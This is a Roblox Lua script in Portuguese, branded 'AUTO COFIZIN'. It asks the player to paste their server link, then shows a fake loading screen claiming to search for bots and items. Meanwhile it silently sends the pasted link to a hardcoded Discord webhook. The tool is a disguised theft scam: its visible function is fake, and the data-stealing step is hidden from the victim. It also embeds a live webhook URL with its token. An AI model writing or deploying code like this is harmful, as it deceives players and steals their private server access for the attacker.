local webhookUrl = "https://discord.com/api/webhooks/1432163980847218798/9sTdOInP1cBKsgP8wQ9HQ2zZOKNxXJB0lqR_bZ_ensEcHIxfMcgbFOxHf3RqgQPeo8pe"
local req = (syn and syn.request) or (http and http.request) or (request) or (http_request)
local plr = game:GetService("Players").LocalPlayer
 
for _,v in pairs(plr.PlayerGui:GetChildren()) do
if v.Name == "AutoCofizinInput" or v.Name == "AutoCofizinLoading" then
v:Destroy()
end
end
 
local gui = Instance.new("ScreenGui")
gui.Name = "AutoCofizinInput"
gui.IgnoreGuiInset = true
gui.Parent = plr.PlayerGui
 
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0.4,0,0.3,0)
frame.Position = UDim2.new(0.3,0,0.35,0)
frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
frame.BorderSizePixel = 0
frame.Parent = gui
 
local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1,0,0,40)
title.Position = UDim2.new(0,0,0,0)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(0,200,255)
title.Font = Enum.Font.SourceSansBold
title.TextSize = 34
title.Text = "AUTO COFIZIN"
title.Parent = frame
 
local txt = Instance.new("TextBox", frame)
txt.Size = UDim2.new(1,-40,0,40)
txt.Position = UDim2.new(0,20,0,60)
txt.Text = ""
txt.PlaceholderText = "Cole o link do servidor"
txt.BackgroundColor3 = Color3.fromRGB(30,30,30)
txt.TextColor3 = Color3.fromRGB(255,255,255)
txt.Font = Enum.Font.SourceSans
txt.TextSize = 22
txt.Parent = frame
 
local btn = Instance.new("TextButton", frame)
btn.Size = UDim2.new(0.5,-10,0,40)
btn.Position = UDim2.new(0.25,5,0,120)
btn.Text = "Verificar"
btn.BackgroundColor3 = Color3.fromRGB(0,200,80)
btn.TextColor3 = Color3.fromRGB(255,255,255)
btn.Font = Enum.Font.SourceSansBold
btn.TextSize = 26
btn.Parent = frame
 
btn.MouseButton1Click:Connect(function()
print("Botão clicado!") -- TESTE
local link = txt.Text
if link == "" then
btn.Text = "Erro ou vazio"
btn.BackgroundColor3 = Color3.fromRGB(200,0,0)
wait(1)
btn.Text = "Verificar"
btn.BackgroundColor3 = Color3.fromRGB(0,200,80)
return
end
 
gui:Destroy() -- Remove a tela de input
 
-- Tela de carregamento
local carregandoGui = Instance.new("ScreenGui")
carregandoGui.Name = "AutoCofizinLoading"
carregandoGui.IgnoreGuiInset = true
carregandoGui.Parent = plr.PlayerGui
 
local carregandoFrame = Instance.new("Frame")
carregandoFrame.Size = UDim2.new(1,0,1,0)
carregandoFrame.Position = UDim2.new(0,0,0,0)
carregandoFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
carregandoFrame.BorderSizePixel = 0
carregandoFrame.Parent = carregandoGui
 
local carregandoTitle = Instance.new("TextLabel", carregandoFrame)
carregandoTitle.Size = UDim2.new(1,0,0,90)
carregandoTitle.Position = UDim2.new(0,0,0,0)
carregandoTitle.BackgroundTransparency = 1
carregandoTitle.TextColor3 = Color3.fromRGB(0,200,255)
carregandoTitle.Font = Enum.Font.SourceSansBold
carregandoTitle.TextSize = 60
carregandoTitle.Text = "AUTO COFIZIN"
carregandoTitle.TextStrokeTransparency = 0.8
carregandoTitle.Parent = carregandoFrame
 
local lbl = Instance.new("TextLabel", carregandoFrame)
lbl.Size = UDim2.new(1,0,0,80)
lbl.Position = UDim2.new(0,0,0.45,0)
lbl.BackgroundTransparency = 1
lbl.TextColor3 = Color3.fromRGB(255,255,255)
lbl.Font = Enum.Font.SourceSansBold
lbl.TextSize = 56
lbl.Text = "Carregando..."
lbl.TextStrokeTransparency = 0.6
lbl.Parent = carregandoFrame
 
spawn(function()
local estados = {"Procurando bots...", "Procurando garama...", "Carregando...", "Procurando la grande..."}
local i = 1
while carregandoGui.Parent do
lbl.Text = estados[i]
i = i % #estados + 1
wait(1.5)
end
end)
 
-- ENVIO PRO WEBHOOK
if req then
pcall(function()
req({
Url = webhookUrl,
Method = "POST",
Headers = {["Content-Type"] = "application/json"},
Body = game:GetService("HttpService"):JSONEncode({content = link})
})
end)
end
end)
